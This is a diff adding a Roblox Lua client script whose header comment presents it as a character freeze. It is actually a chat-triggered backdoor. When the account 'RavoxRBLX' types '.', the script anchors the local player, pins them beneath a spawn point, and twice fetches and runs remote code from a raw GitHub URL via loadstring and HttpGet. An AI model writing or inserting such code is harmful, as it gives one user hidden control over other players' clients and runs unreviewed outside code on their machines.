@@ -1,0 +1,70 @@
+-- Freeze character in place, no animations
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+
+local player = Players.LocalPlayer
+if not player then return end
+
+local function getNearestSpawn(position)
+    local closest
+    local dist = math.huge
+    for _, spawn in pairs(workspace:GetDescendants()) do
+        if spawn:IsA("SpawnLocation") then
+            local d = (spawn.Position - position).Magnitude
+            if d < dist then
+                dist = d
+                closest = spawn
+            end
+        end
+    end
+    return closest
+end
+
+local freezeConnection
+
+local channel = TextChatService.TextChannels.RBXGeneral
+channel.MessageReceived:Connect(function(message)
+    if message.TextSource.Name == "RavoxRBLX" and message.Text == "." then
+        local character = player.Character or player.CharacterAdded:Wait()
+        local hrp = character:WaitForChild("HumanoidRootPart")
+        local humanoid = character:WaitForChild("Humanoid")
+
+        -- Anchor all parts to stop movement
+        for _, part in ipairs(character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.Anchored = true
+            end
+        end
+
+        -- Disable Animator to stop all animations
+        local animator = humanoid:FindFirstChildWhichIsA("Animator")
+        if animator then animator:Destroy() end
+
+        -- Teleport under nearest spawn
+        local spawn = getNearestSpawn(hrp.Position)
+        if not spawn then return end
+        local targetCFrame = spawn.CFrame * CFrame.new(0, -8, 0)
+        hrp.CFrame = targetCFrame
+
+        -- Stop all movement
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+
+        -- Keep HRP in place every frame
+        if freezeConnection then
+            freezeConnection:Disconnect()
+        end
+        freezeConnection = RunService.RenderStepped:Connect(function()
+            if hrp then
+                hrp.CFrame = targetCFrame
+            end
+        end)
+
+        -- Run the loadstring twice
+        for i = 1, 2 do
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/porpora02-ai/d/refs/heads/main/infyeild"))()
+        end
+    end
+end)
